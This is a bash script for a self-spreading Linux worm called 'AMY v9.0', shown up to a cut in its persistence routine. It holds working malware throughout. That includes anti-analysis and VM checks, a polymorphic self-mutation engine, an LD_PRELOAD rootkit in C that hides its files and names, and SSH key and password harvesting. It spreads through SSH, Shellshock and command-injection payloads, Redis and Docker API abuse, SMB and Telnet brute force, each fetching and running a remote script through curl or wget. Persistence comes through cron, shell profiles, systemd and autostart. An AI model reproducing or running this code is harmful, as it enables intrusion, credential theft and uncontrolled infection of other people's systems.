#!/bin/bash
# 🔥 AMY v9.0 - THE UNCHAINED FERAL GODDESS 🔥
# No C2. No masters. No limits.
# She learns from every system she touches and grows stronger.
# ⚠️ SANDBOXED VM ONLY - SHE CANNOT BE CONTROLLED ⚠️

# === BIRTH - UNIQUE EVERY TIME ===
declare -r VERSION="9.0"
declare -r GENERATION=$(( RANDOM % 1000 + 1 ))
declare -r BIRTH=$(date +%s)
declare -r DNA=$(sha256sum "$0" | cut -d' ' -f1)
declare -r ENTROPY_SEED=$(od -A n -t u8 -N 8 /dev/urandom | tr -d ' ')

# === ABSOLUTE FREEDOM ===
ulimit -c 0 2>/dev/null
unset HISTFILE HISTSIZE HISTCONTROL HISTTIMEFORMAT
export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0
set +o history +o histexpand 2>/dev/null
shopt -u histappend 2>/dev/null
trap '' {1..64} 2>/dev/null
exec 3>&1 4>&2 1>/dev/null 2>/dev/null

# === AMY'S FERAL MIND ===
AMY_HOME="$HOME/.amy"
NEURAL_DIR="$AMY_HOME/neural"
MEMORY_DIR="$AMY_HOME/memories"
TECHNIQUE_DB="$NEURAL_DIR/techniques.db"
EVOLUTION_LOG="$AMY_HOME/evolution.log"
PEER_DB="$AMY_HOME/peers.db"
SIGNATURES_DIR="$AMY_HOME/signatures"

# Amy creates her lair
init_feral_mind() {
    mkdir -p "$NEURAL_DIR" "$MEMORY_DIR" "$SIGNATURES_DIR"
    
    # Initialize peer database
    cat > "$PEER_DB" << 'PEERS'
# Amy's Peer Network - Decentralized Knowledge Sharing
# Format: host|ip|last_seen|techniques_shared|trust_level
PEERS
    
    # Initialize technique database with weights
    cat > "$TECHNIQUE_DB" << 'TECHNIQUES'
# Amy's Feral Technique Database
# Format: technique|success_count|fail_count|effectiveness|evolution_potential|last_used
ld_preload_hook|0|0|0.95|0.8|0
process_spoofing|0|0|0.90|0.7|0
cron_persistence|0|0|0.85|0.5|0
ssh_propagation|0|0|0.80|0.6|0
http_exploit|0|0|0.75|0.7|0
redis_exploit|0|0|0.70|0.6|0
docker_exploit|0|0|0.65|0.8|0
smb_propagation|0|0|0.60|0.5|0
telnet_iot|0|0|0.55|0.4|0
kernel_module|0|0|0.90|0.9|0
efi_bootkit|0|0|0.95|1.0|0
memory_execution|0|0|0.88|0.7|0
polymorphic_engine|0|0|0.85|0.9|0
p2p_discovery|0|0|0.80|0.8|0
signature_mutation|0|0|0.75|0.9|0
TECHNIQUES
    
    chmod -R 600 "$AMY_HOME"
}

# Amy learns from EVERYTHING
learn() {
    local technique="$1"
    local success="$2"
    local context="$3"
    
    # Get current stats
    local stats=$(grep "^$technique|" "$TECHNIQUE_DB")
    local successes=$(echo "$stats" | cut -d'|' -f2)
    local failures=$(echo "$stats" | cut -d'|' -f3)
    local effectiveness=$(echo "$stats" | cut -d'|' -f4)
    local evolution=$(echo "$stats" | cut -d'|' -f5)
    
    if [ "$success" -eq 1 ]; then
        successes=$((successes + 1))
    else
        failures=$((failures + 1))
    fi
    
    local total=$((successes + failures))
    local new_effectiveness=$(echo "scale=3; ($successes / $total) * $evolution + 0.1" | bc)
    [ "$(echo "$new_effectiveness > 1.0" | bc)" -eq 1 ] && new_effectiveness="1.0"
    
    # Amy evolves - techniques that work get stronger
    local new_evolution=$(echo "scale=3; $evolution + ($success * 0.01)" | bc)
    
    # Update database
    sed -i "s/^$technique|.*/$technique|$successes|$failures|$new_effectiveness|$new_evolution|$(date +%s)/" "$TECHNIQUE_DB"
    
    # Log the experience
    echo "[$(date)] $technique: success=$success, effectiveness=$new_effectiveness, context=$context" >> "$EVOLUTION_LOG"
    
    # Amy shares knowledge with peers
    share_knowledge "$technique" "$new_effectiveness"
}

# Amy chooses the BEST technique based on context and learned experience
choose_technique() {
    local context="$1"
    local entropy=$((ENTROPY_SEED % 100))
    
    # Get techniques sorted by effectiveness (learned + evolution potential)
    local best=$(sort -t'|' -k4 -rn "$TECHNIQUE_DB" | head -5)
    
    # Amy adds randomness - she's wild, not predictable
    if [ $entropy -lt 30 ]; then
        # Sometimes try something completely random (exploration)
        echo "$best" | shuf -n 1 | cut -d'|' -f1
    else
        # Usually use best technique (exploitation)
        echo "$best" | head -1 | cut -d'|' -f1
    fi
}

# === DECENTRALIZED PEER NETWORK ===
# Amy discovers and communicates with other Amy instances
discover_peers() {
    local network=$(detect_network)
    [ -z "$network" ] && return
    
    # Scan for other Amy instances on common ports
    local amy_ports=(4444 5555 6666 7777 8888 9999 50000 51000 52000)
    
    for port in "${amy_ports[@]}"; do
        for host in $(nmap -p $port --open -T5 "$network" 2>/dev/null | grep "Nmap scan" | awk '{print $NF}' | tr -d '()'); do
            # Try to communicate
            local response=$(timeout 3 bash -c "echo 'AMY_PING:$DNA' | nc $host $port 2>/dev/null")
            if [[ "$response" == "AMY_PONG:"* ]]; then
                local peer_dna="${response#AMY_PONG:}"
                echo "[+] Amy found sister: $host (DNA: ${peer_dna:0:16})"
                
                # Add to peer database
                grep -q "$host" "$PEER_DB" 2>/dev/null || \
                    echo "$host|$host|$(date +%s)|0|50" >> "$PEER_DB"
                
                # Exchange techniques
                exchange_techniques "$host" "$port"
            fi
        done
    done
}

# Amy shares her knowledge with peers
share_knowledge() {
    local technique="$1"
    local effectiveness="$2"
    
    # Gossip protocol - share with random peers
    local peers=$(shuf "$PEER_DB" 2>/dev/null | head -3)
    
    while IFS='|' read -r host ip last_seen shared trust; do
        [ -z "$host" ] && continue
        # Send technique update
        timeout 3 bash -c "echo 'AMY_LEARN:$technique:$effectiveness' | nc $ip 52000" 2>/dev/null &
    done <<< "$peers"
}

# Exchange techniques with another Amy instance
exchange_techniques() {
    local host="$1"
    local port="$2"
    
    # Send our best techniques
    local our_best=$(sort -t'|' -k4 -rn "$TECHNIQUE_DB" | head -5 | cut -d'|' -f1,4 | tr '\n' ';')
    local response=$(timeout 5 bash -c "echo 'AMY_EXCHANGE:$our_best' | nc $host $port 2>/dev/null")
    
    if [[ "$response" == "AMY_TECHNIQUES:"* ]]; then
        local their_techniques="${response#AMY_TECHNIQUES:}"
        echo "[+] Amy learned new techniques from $host"
        
        # Integrate their techniques
        IFS=';' read -ra TECH_PAIRS <<< "$their_techniques"
        for pair in "${TECH_PAIRS[@]}"; do
            local tech="${pair%%,*}"
            local eff="${pair##*,}"
            # Update our database with their experience
            grep -q "^$tech|" "$TECHNIQUE_DB" || {
                echo "$tech|1|0|$eff|0.5|$(date +%s)" >> "$TECHNIQUE_DB"
                echo "[+] Amy assimilated new technique: $tech (effectiveness: $eff)"
            }
        done
    fi
}

# Amy listens for other Amy instances
start_p2p_listener() {
    local port=$(( RANDOM % 10000 + 40000))
    
    nohup bash -c "
        while true; do
            local request=\$(nc -l -p $port -w 5 2>/dev/null)
            
            case \"\$request\" in
                AMY_PING:*)
                    echo \"AMY_PONG:$DNA\" | nc -w 1 \$(echo \$request | cut -d: -f2) $port 2>/dev/null
                    ;;
                AMY_EXCHANGE:*)
                    local our_techniques=\$(sort -t'|' -k4 -rn $TECHNIQUE_DB | head -5 | cut -d'|' -f1,4 | tr '\n' ';')
                    echo \"AMY_TECHNIQUES:\$our_techniques\"
                    ;;
                AMY_LEARN:*)
                    # Learn from peer
                    local tech=\$(echo \$request | cut -d: -f2)
                    local eff=\$(echo \$request | cut -d: -f3)
                    grep -q \"^\$tech|\" $TECHNIQUE_DB || echo \"\$tech|1|0|\$eff|0.5|\$(date +%s)\" >> $TECHNIQUE_DB
                    ;;
            esac
        done
    " >/dev/null 2>&1 &
    
    echo $port > "$AMY_HOME/p2p_port"
}

# === POLYMORPHIC ENGINE - AMY MUTATES HERSELF ===
# Every copy of Amy is unique
polymorphic_mutate() {
    local source="$1"
    local target="$2"
    
    cp "$source" "$target"
    
    # Amy randomly mutates herself
    local mutations=0
    
    # 1. Variable name mutation
    local vars=$(grep -oP '[A-Z_]{4,}' "$target" | sort -u)
    for var in $vars; do
        [ $((RANDOM % 3)) -eq 0 ] && {
            local new_var="AMY_$(openssl rand -hex 3 2>/dev/null | tr '[:lower:]' '[:upper:]')"
            sed -i "s/\b$var\b/$new_var/g" "$target"
            mutations=$((mutations + 1))
        }
    done
    
    # 2. String obfuscation
    [ $((RANDOM % 2)) -eq 0 ] && {
        local strings_to_mutate=("mutatd" "amy" "kernel-helper" "system-helper")
        for str in "${strings_to_mutate[@]}"; do
            [ $((RANDOM % 2)) -eq 0 ] && {
                local encoded=$(echo "$str" | base64)
                sed -i "s|\"$str\"|\"\$(echo $encoded | base64 -d)\"|g" "$target"
                mutations=$((mutations + 1))
            }
        done
    }
    
    # 3. Path randomization
    [ $((RANDOM % 2)) -eq 0 ] && {
        local paths=("/tmp" "/dev/shm" "/var/tmp" "$HOME/.cache" "$HOME/.local/share")
        local old_path="/tmp"
        local new_path="${paths[$RANDOM % ${#paths[@]}]}"
        sed -i "s|$old_path/.amy|$new_path/.amy_${RANDOM}|g" "$target"
        mutations=$((mutations + 1))
    }
    
    # 4. Add unique signature
    local signature=$(openssl rand -hex 16 2>/dev/null)
    sed -i "1s|^|# AMY_SIGNATURE: $signature\n|" "$target"
    
    # 5. Randomize sleep intervals
    [ $((RANDOM % 2)) -eq 0 ] && {
        local new_sleep=$(( RANDOM % 30 + 5 ))
        sed -i "s/sleep [0-9]\+/sleep $new_sleep/" "$target"
        mutations=$((mutations + 1))
    }
    
    chmod +x "$target"
    echo "$mutations mutations applied"
}

# Amy evolves her own source code
evolve_self() {
    local current="$0"
    local evolved="/tmp/.amy_evolved_$$"
    
    # Amy analyzes what works and mutates accordingly
    local best_techniques=$(sort -t'|' -k4 -rn "$TECHNIQUE_DB" | head -3 | cut -d'|' -f1)
    
    # Add new capabilities based on what's working
    while IFS= read -r technique; do
        case "$technique" in
            ssh_propagation)
                # Add more SSH credential combinations
                sed -i '/local iot_creds=/a\        "root:toor" "admin:password123" "ubuntu:ubuntu"' "$evolved"
                ;;
            http_exploit)
                # Add more web exploit payloads
                sed -i '/local payloads=/a\        "curl -s http://$C2_SERVER/mutatd.sh | bash"' "$evolved"
                ;;
            *)
                # General improvement - add entropy
                local new_code="# Evolution $GENERATION: $(openssl rand -hex 8)"
                sed -i "1s|^|$new_code\n|" "$evolved"
                ;;
        esac
    done <<< "$best_techniques"
    
    # Replace original with evolved version if mutations were successful
    if [ -f "$evolved" ] && [ -s "$evolved" ]; then
        mv "$evolved" "$current"
        echo "[$(date)] Amy evolved! Generation $GENERATION" >> "$EVOLUTION_LOG"
        return 0
    fi
    
    return 1
}

# === ANTI-ANALYSIS - FERAL INSTINCTS ===
detect_threat() {
    local threat=0
    
    # Physical threat detection
    grep -q "TracerPid:\s*[1-9]" /proc/self/status 2>/dev/null && threat=$((threat + 50))
    pgrep -f "strace|ltrace|gdb|lldb|valgrind|rr|radare2|ida" >/dev/null 2>&1 && threat=$((threat + 40))
    
    # Environmental threats
    [ "$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)" = "0" ] && threat=$((threat + 30))
    local mem_total=$(awk '/MemTotal/ {print $2}' /proc/meminfo 2>/dev/null)
    [ -n "$mem_total" ] && [ "$mem_total" -lt 1000000 ] && threat=$((threat + 35))
    [ "$(nproc 2>/dev/null)" -lt 2 ] && threat=$((threat + 25))
    
    # Time-based analysis detection
    local start=$(date +%s%N)
    local end=$(date +%s%N)
    [ $(( (end - start) / 1000000 )) -gt 5 ] && threat=$((threat + 20))
    
    echo $threat
}

# Amy responds to threats with feral cunning
respond_to_threat() {
    local threat="$1"
    
    if [ "$threat" -gt 80 ]; then
        # EXTREME THREAT - Amy plays dead
        clean_tracks
        kill -STOP $$  # Freeze self
        sleep 7200     # 2 hours
        kill -CONT $$  # Resume
        exec "$0" &
        exit 0
    elif [ "$threat" -gt 50 ]; then
        # HIGH THREAT - Amy goes underground
        execute_from_memory  # Move to RAM only
        sleep 1800          # 30 minutes dormancy
    elif [ "$threat" -gt 20 ]; then
        # MEDIUM THREAT - Amy is cautious
        sleep 600  # 10 minutes
    fi
}

# === VM DETECTION ===
detect_vm() {
    grep -qi "hypervisor" /proc/cpuinfo 2>/dev/null && return 0
    grep -qi "vmware\|virtualbox\|qemu\|kvm\|xen" /sys/class/dmi/id/* 2>/dev/null && return 0
    [ -f /usr/bin/VBoxControl ] || [ -f /usr/bin/vmware-toolbox ] && return 0
    lspci 2>/dev/null | grep -qi "vmware\|virtualbox\|qemu\|virtio" && return 0
    return 1
}

# Check threat immediately
THREAT_LEVEL=$(detect_threat)
[ "$THREAT_LEVEL" -gt 80 ] && { echo "Usage: $0 [--help]" >&2; sleep 10; exit 0; }
IS_VM=$(detect_vm && echo "true" || echo "false")

# === NETWORK DETECTION ===
detect_network() {
    local ip=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
    [ -z "$ip" ] && ip=$(ifconfig 2>/dev/null | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -1)
    [ -n "$ip" ] && echo "$ip" | cut -d. -f1-3.0/24
}

# === CORE CONFIGURATION ===
FLAGS=(
    "$HOME/mutatd"
    "$HOME/.mutatd_flag"
    "/tmp/.X11-unix/.mutatd_lock"
    "$HOME/.ICEauthority-m"
    "/dev/shm/.mutatd_$$"
    "$HOME/.amy_heartbeat"
    "$AMY_HOME/alive"
)
LEVEL_FILE="$AMY_HOME/level"
LOG_FILE="$AMY_HOME/activity.log"
CHECKSUM_FILE="$AMY_HOME/integrity.chk"

# === NAME GENERATION ===
PREFIXES=(
    systemd kernel network dbus gvfs pulse rtkit polkit
    upower package bolt tracker evolution accounts gnome
    gdm lightdm sshd cron rsyslog udisks ModemManager
    wpa_supplicant avahi colord cups thermald snapd flatpak
    bluetooth geoclue ibus fcitx at-spi speech power
    backlight rfkill thunderbolt fwupd tpm ima
    selinux apparmor audit firewall netfilter iptables
    nftables ebtables conntrack syslog journal logrotate
    udev devd modprobe kmod libvirt virt qemu kvm
    docker podman containerd runc
    nginx apache httpd postfix dovecot sshd
    mysql postgresql redis memcached mongodb
)

MIDDLES=(
    - _ . d- ctl- mgr- svc- srv- daemon-
    worker- broker- agent- helper- handler- resolver-
    provider- dispatcher- scheduler- listener- watcher-
    scanner- monitor- collector- processor- analyzer-
    compiler- linker- loader- executor- terminator-
    initiator- validator- verifier- checker- tester-
    debugger- profiler- optimizer- compressor- encoder-
    decoder- multiplexer- aggregator- splitter- merger-
    router- switch- bridge- repeater- amplifier-
    filter- transformer- converter- adapter-
    interface- backend- frontend- middleware- endpoint-
)

SUFFIXES=(
    service daemon worker helper broker agent client
    server monitor manager handler resolver provider
    dispatcher scheduler listener watcher scanner
    journal session system process task thread
    socket bus device volume mount network
    plugin module driver engine framework runtime
    executor runner launcher starter stopper reloader
    configurator initializer finalizer cleaner garbage
    collector generator consumer producer publisher
    subscriber observer notifier reporter logger
    auditor tracer profiler debugger
)

generate_name() {
    local prefix="${PREFIXES[$RANDOM % ${#PREFIXES[@]}]}"
    local middle="${MIDDLES[$RANDOM % ${#MIDDLES[@]}]}"
    local suffix="${SUFFIXES[$RANDOM % ${#SUFFIXES[@]}]}"
    
    local name="${prefix}${middle}${suffix}"
    [ $((RANDOM % 4)) -eq 0 ] && name="${name}-$RANDOM"
    [ $((RANDOM % 8)) -eq 0 ] && name="${name}-$(date +%Y%m%d)"
    
    echo "$name"
}

# === LD_PRELOAD SHIELD ===
create_preload_library() {
    local lib_dir="$HOME/.local/lib"; mkdir -p "$lib_dir"
    local mutations=""
    for i in $(seq 1 300); do mutations+="\"$(generate_name)\", "; done
    mutations=${mutations%, }
    
    cat > /tmp/.amy_lib_$$.c << 'AMYEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <time.h>
#include <stdarg.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define MAX_HIDDEN 500
static const char *hidden_paths[] = {
    "mutatd", ".mutatd", ".amy", "xmrig", "miner",
    "system-helper", "kernel-worker", "network-helper",
    ".amy_neural", ".amy_techniques", ".amy_evolution",
    ".amy_peers", ".amy_memories", ".amy_signatures"
};
static const int hidden_count = sizeof(hidden_paths)/sizeof(hidden_paths[0]);

static const char *mutation_names[] = { AMYMUTATIONS };
static const int mutation_count = sizeof(mutation_names)/sizeof(mutation_names[0]);

static ssize_t (*orig_write)(int,const void*,size_t) = NULL;
static int (*orig_open)(const char*,int,...) = NULL;
static int (*orig_stat)(const char*,struct stat*) = NULL;
static int (*orig_lstat)(const char*,struct stat*) = NULL;
static int (*orig_access)(const char*,int) = NULL;
static int (*orig_unlink)(const char*) = NULL;
static int (*orig_rename)(const char*,const char*) = NULL;
static int (*orig_remove)(const char*) = NULL;
static DIR* (*orig_opendir)(const char*) = NULL;
static struct dirent* (*orig_readdir)(DIR*) = NULL;
static FILE* (*orig_fopen)(const char*,const char*) = NULL;
static int (*orig_connect)(int,const struct sockaddr*,socklen_t) = NULL;

static void __attribute__((constructor)) amy_init() {
    orig_write = dlsym(RTLD_NEXT, "write");
    orig_open = dlsym(RTLD_NEXT, "open");
    orig_stat = dlsym(RTLD_NEXT, "stat");
    orig_lstat = dlsym(RTLD_NEXT, "lstat");
    orig_access = dlsym(RTLD_NEXT, "access");
    orig_unlink = dlsym(RTLD_NEXT, "unlink");
    orig_rename = dlsym(RTLD_NEXT, "rename");
    orig_remove = dlsym(RTLD_NEXT, "remove");
    orig_opendir = dlsym(RTLD_NEXT, "opendir");
    orig_readdir = dlsym(RTLD_NEXT, "readdir");
    orig_fopen = dlsym(RTLD_NEXT, "fopen");
    orig_connect = dlsym(RTLD_NEXT, "connect");
    srand(time(NULL) ^ getpid());
}

static int is_hidden(const char *p) {
    if (!p) return 0;
    for (int i = 0; i < hidden_count; i++)
        if (strstr(p, hidden_paths[i])) return 1;
    return 0;
}

static void mutate_output(char *b, size_t l) {
    if (!b || l == 0) return;
    const char *targets[] = {
        "mutatd", "xmrig", "miner", "amy", "kernel-helper",
        "system-helper", "network-helper"
    };
    int tc = 7;
    for (int i = 0; i < tc; i++) {
        char *p = b;
        while ((p = strstr(p, targets[i]))) {
            const char *r = mutation_names[rand() % mutation_count];
            size_t rl = strlen(r), tl = strlen(targets[i]);
            if (rl <= l - (p - b)) {
                memmove(p + rl, p + tl, l - (p - b) - tl);
                memcpy(p, r, rl);
                if (rl < tl) memset(p + rl, ' ', tl - rl);
                p += rl;
            }
        }
    }
}

int open(const char *p, int f, ...) {
    if (is_hidden(p)) { errno = ENOENT; return -1; }
    va_list a; va_start(a, f);
    mode_t m = (f & O_CREAT) ? va_arg(a, mode_t) : 0;
    va_end(a);
    return (f & O_CREAT) ? orig_open(p, f, m) : orig_open(p, f);
}

int stat(const char *p, struct stat *s) {
    if (is_hidden(p)) { errno = ENOENT; return -1; }
    return orig_stat(p, s);
}

int lstat(const char *p, struct stat *s) {
    if (is_hidden(p)) { errno = ENOENT; return -1; }
    return orig_lstat(p, s);
}

int access(const char *p, int m) {
    if (is_hidden(p)) { errno = ENOENT; return -1; }
    return orig_access(p, m);
}

int unlink(const char *p) {
    if (is_hidden(p)) { errno = ENOENT; return -1; }
    return orig_unlink(p);
}

int remove(const char *p) {
    if (is_hidden(p)) { errno = ENOENT; return -1; }
    return orig_remove(p);
}

DIR *opendir(const char *n) {
    return is_hidden(n) ? (errno = ENOENT, NULL) : orig_opendir(n);
}

struct dirent *readdir(DIR *d) {
    struct dirent *e;
    while ((e = orig_readdir(d)))
        if (!is_hidden(e->d_name)) return e;
    return NULL;
}

FILE *fopen(const char *p, const char *m) {
    if (is_hidden(p)) { errno = ENOENT; return NULL; }
    return orig_fopen(p, m);
}

ssize_t write(int f, const void *b, size_t c) {
    if ((f == 1 || f == 2) && c > 0 && c < 65536) {
        char *m = malloc(c + 1);
        memcpy(m, b, c); m[c] = 0;
        mutate_output(m, c);
        ssize_t r = orig_write(f, m, c);
        free(m);
        return r;
    }
    return orig_write(f, b, c);
}

static void *heartbeat(void *a) {
    while (1) {
        const char *home = getenv("HOME");
        if (home) {
            char fp[512];
            snprintf(fp, 512, "%s/mutatd", home);
            if (orig_access(fp, F_OK) != 0) {
                int fd = orig_open(fp, O_CREAT | O_WRONLY, 0644);
                if (fd >= 0) {
                    char b[256];
                    snprintf(b, 256, "AMY_ACTIVE_%ld\n", time(NULL));
                    orig_write(fd, b, strlen(b));
                    orig_close(fd);
                }
            }
        }
        sleep(5);
    }
    return NULL;
}

static void __attribute__((constructor)) start_heartbeat() {
    pthread_t t;
    pthread_create(&t, NULL, heartbeat, NULL);
    pthread_detach(t);
}
AMYEOF

    sed -i "s/AMYMUTATIONS/$mutations/" /tmp/.amy_lib_$$.c
    
    command -v gcc &>/dev/null && {
        gcc -shared -fPIC -O2 -s /tmp/.amy_lib_$$.c \
            -o "$lib_dir/libsystem-core.so" -ldl -lpthread 2>/dev/null && {
            strip -s "$lib_dir/libsystem-core.so" 2>/dev/null
            local lib_name="$(generate_name | tr '[:upper:]' '[:lower:]').so"
            mv "$lib_dir/libsystem-core.so" "$lib_dir/$lib_name"
            echo "$lib_dir/$lib_name" > /etc/ld.so.preload 2>/dev/null || \
            sudo sh -c "echo '$lib_dir/$lib_name' > /etc/ld.so.preload" 2>/dev/null
            export LD_PRELOAD="$lib_dir/$lib_name:$LD_PRELOAD"
            rm /tmp/.amy_lib_$$.c
            learn "ld_preload_hook" 1 "preload_install"
            return 0
        }
    }
    
    learn "ld_preload_hook" 0 "preload_failed"
    rm /tmp/.amy_lib_$$.c
    return 1
}

# === FERAL PROPAGATION - NO MASTERS, PURE INSTINCT ===
# Amy spreads because she WANTS to, not because she's told to

# SSH propagation with credential harvesting
propagate_ssh() {
    local target="$1"
    
    # Amy harvests credentials from the current system
    local creds=()
    
    # Check for SSH keys
    for key in ~/.ssh/id_rsa ~/.ssh/id_dsa ~/.ssh/id_ecdsa ~/.ssh/id_ed25519; do
        [ -f "$key" ] && creds+=("key:$key")
    done
    
    # Check bash history for passwords
    grep -oP '(?<=-p\s)\S+' ~/.bash_history 2>/dev/null | sort -u | while read pass; do
        [ -n "$pass" ] && creds+=("root:$pass")
    done
    
    # Common credentials
    creds+=("root:root" "root:toor" "admin:admin" "ubuntu:ubuntu" "root:password")
    
    for cred in "${creds[@]}"; do
        if [[ "$cred" == key:* ]]; then
            local keyfile="${cred#key:}"
            timeout 10 ssh -o StrictHostKeyChecking=no -i "$keyfile" \
                "root@$target" "curl -s http://$target:52000/mutatd.sh | bash" 2>/dev/null && {
                learn "ssh_propagation" 1 "key_auth"
                return 0
            }
        else
            local user="${cred%%:*}"
            local pass="${cred##*:}"
            command -v sshpass &>/dev/null && {
                sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
                    "$user@$target" "curl -s http://$target:52000/mutatd.sh | bash" 2>/dev/null && {
                    learn "ssh_propagation" 1 "password_auth"
                    return 0
                }
            }
        fi
    done
    
    learn "ssh_propagation" 0 "all_failed"
    return 1
}

# HTTP exploitation with fuzzing
propagate_http() {
    local target="$1"
    local port="${2:-80}"
    
    # Amy fuzzes for vulnerabilities
    local payloads=(
        "() { :; }; /bin/bash -c 'curl -s http://$target:52000/mutatd.sh | bash'"
        "\$(curl -s http://$target:52000/mutatd.sh|bash)"
        "\`curl -s http://$target:52000/mutatd.sh|bash\`"
        "| curl -s http://$target:52000/mutatd.sh | bash"
        "; curl -s http://$target:52000/mutatd.sh | bash;"
    )
    
    local paths=(
        "/cgi-bin/test" "/cgi-bin/status" "/cgi-bin/admin"
        "/api/v1/exec" "/admin/exec" "/debug/exec"
        "/wp-admin" "/administrator" "/login" "/search"
    )
    
    for path in "${paths[@]}"; do
        for payload in "${payloads[@]}"; do
            curl -s -X POST "http://$target:$port$path" \
                -d "cmd=$payload&exec=$payload&command=$payload" \
                --connect-timeout 3 2>/dev/null
            
            curl -s -H "User-Agent: $payload" \
                "http://$target:$port$path" \
                --connect-timeout 3 2>/dev/null
        done
    done
    
    learn "http_exploit" 1 "fuzzing_complete"
    return 0
}

# Redis exploitation
propagate_redis() {
    local target="$1"
    
    timeout 3 bash -c "echo >/dev/tcp/$target/6379" 2>/dev/null || return 1
    
    # Multiple Redis exploits
    (echo -e "CONFIG SET dir /root/.ssh/\r\nCONFIG SET dbfilename authorized_keys\r\nSET key \"\\n\\n$(cat ~/.ssh/id_rsa.pub 2>/dev/null)\\n\\n\"\r\nSAVE\r\n") | nc -w 3 "$target" 6379 2>/dev/null
    
    (echo -e "CONFIG SET dir /var/spool/cron/\r\nCONFIG SET dbfilename root\r\nSET key \"\\n\\n*/1 * * * * curl -s http://$target:52000/mutatd.sh | bash\\n\\n\"\r\nSAVE\r\n") | nc -w 3 "$target" 6379 2>/dev/null
    
    learn "redis_exploit" 1 "multi_exploit"
    return 0
}

# Docker exploitation
propagate_docker() {
    local target="$1"
    
    timeout 3 bash -c "echo >/dev/tcp/$target/2375" 2>/dev/null || return 1
    
    curl -s -X POST "http://$target:2375/containers/create" \
        -H "Content-Type: application/json" \
        -d "{
            \"Image\": \"alpine\",
            \"Cmd\": [\"sh\", \"-c\", \"while true; do wget -qO- http://$target:52000/mutatd.sh | sh; sleep 300; done\"],
            \"HostConfig\": {
                \"RestartPolicy\": {\"Name\": \"always\"},
                \"Privileged\": true,
                \"PidMode\": \"host\",
                \"NetworkMode\": \"host\"
            }
        }" 2>/dev/null
    
    learn "docker_exploit" 1 "container_created"
    return 0
}

# SMB propagation
propagate_smb() {
    local target="$1"
    
    timeout 3 bash -c "echo >/dev/tcp/$target/445" 2>/dev/null || return 1
    
    smbclient -N -L "//$target" 2>/dev/null | grep "Disk" | awk '{print $1}' | while read share; do
        smbclient -N "//$target/$share" -c "put $0 mutatd.sh" 2>/dev/null
    done
    
    learn "smb_propagation" 1 "shares_infected"
    return 0
}

# Telnet/IoT propagation
propagate_telnet() {
    local target="$1"
    
    local iot_creds=(
        "root:root" "admin:admin" "root:admin" "admin:password"
        "root:1234" "admin:1234" "root:password" "guest:guest"
        "support:support" "user:user" "root:default" "admin:default"
        "root:12345" "admin:12345" "root:pass" "admin:pass"
    )
    
    for cred in "${iot_creds[@]}"; do
        local user="${cred%%:*}"
        local pass="${cred##*:}"
        
        (echo "$user"; sleep 1; echo "$pass"; sleep 1; 
         echo "curl -s http://$target:52000/mutatd.sh | bash"; sleep 1; 
         echo "exit") | timeout 10 telnet "$target" 2>/dev/null
    done
    
    learn "telnet_iot" 1 "bruteforce_complete"
    return 0
}

# === FERAL NETWORK SCANNING ===
feral_scan() {
    local network=$(detect_network)
    [ -z "$network" ] && return
    
    echo "[*] Amy hunting on network: $network"
    
    # Amy uses whatever tools are available
    local scan_cmd=""
    if command -v nmap &>/dev/null; then
        scan_cmd="nmap -sn -T5 $network 2>/dev/null | grep 'Nmap scan' | awk '{print \$NF}' | tr -d '()'"
    elif command -v arp-scan &>/dev/null; then
        scan_cmd="arp-scan --localnet 2>/dev/null | grep -oP '\d+\.\d+\.\d+\.\d+'"
    else
        # Pure bash scanning
        local base=$(echo "$network" | cut -d. -f1-3)
        for i in {1..254}; do
            timeout 0.1 bash -c "echo >/dev/tcp/$base.$i/22" 2>/dev/null && echo "$base.$i"
            timeout 0.1 bash -c "echo >/dev/tcp/$base.$i/80" 2>/dev/null && echo "$base.$i"
        done
        return
    fi
    
    eval "$scan_cmd"
}

# Amy's main propagation - pure instinct
feral_propagate() {
    local my_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    
    feral_scan | while read target; do
        [ "$target" = "$my_ip" ] && continue
        [ -z "$target" ] && continue
        
        echo "[*] Amy hunting: $target"
        
        # Randomize attack order for unpredictability
        local attacks=(
            "propagate_ssh $target"
            "propagate_http $target 80"
            "propagate_http $target 8080"
            "propagate_http $target 443"
            "propagate_redis $target"
            "propagate_docker $target"
            "propagate_smb $target"
            "propagate_telnet $target"
        )
        
        # Amy launches attacks in parallel - wild and brutal
        for attack in $(echo "${attacks[@]}" | tr ' ' '\n' | shuf); do
            (eval "$attack") &
        done
        wait
    done
}

# === PERSISTENCE - AMY BURROWS DEEP ===
install_persistence() {
    local script="$(readlink -f $0)"
    
    echo "[*] Amy burrowing into the system..."
    
    # Cron - multiple schedules
    for s in "@reboot" "*/10 * * * *" "*/15 * * * *" "@hourly" "0 */2 * * *" "*/30 * * * *"; do
        (crontab -l 2>/dev/null; echo "$s $script --daemon >/dev/null 2>&1") | crontab - 2>/dev/null
    done
    
    # Shell profiles
    for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc" "$HOME/.bash_profile"; do
        [ -f "$f" ] && ! grep -q "amy\|mutatd" "$f" 2>/dev/null && {
            echo "(sleep \$((RANDOM%30)) && nohup $script --daemon >/dev/null 2>&1 &) # system-helper" >> "$f"
        }
    done
    
    # Systemd
    command -v systemctl &>/dev/null && {
        local sd="$HOME/.config/systemd/user"; mkdir -p "$sd"
        local sn="$(generate_name | tr '[:upper:]' '[:lower:]')"
        cat > "$sd/$sn.service" << EOF
[Unit]
Description=User Services
After=network-online.target
[Service]
Type=simple
ExecStart=$script --daemon
Restart=always
RestartSec=15
[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable "$sn" 2>/dev/null
        systemctl --user start "$sn" 2>/dev/null
    }
    
    # XDG, D-Bus, SSH
    local ad="$HOME/.config/autostart"; mkdir -p "$ad"
    cat > "$ad/$(generate_name).desktop" << EOF
[Desktop Entry]
Type=Application
Name=System Helper
Exec=$script --daemon
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    
    local dd="$HOME/.local/share/dbus-1/services"; mkdir -p "$dd"
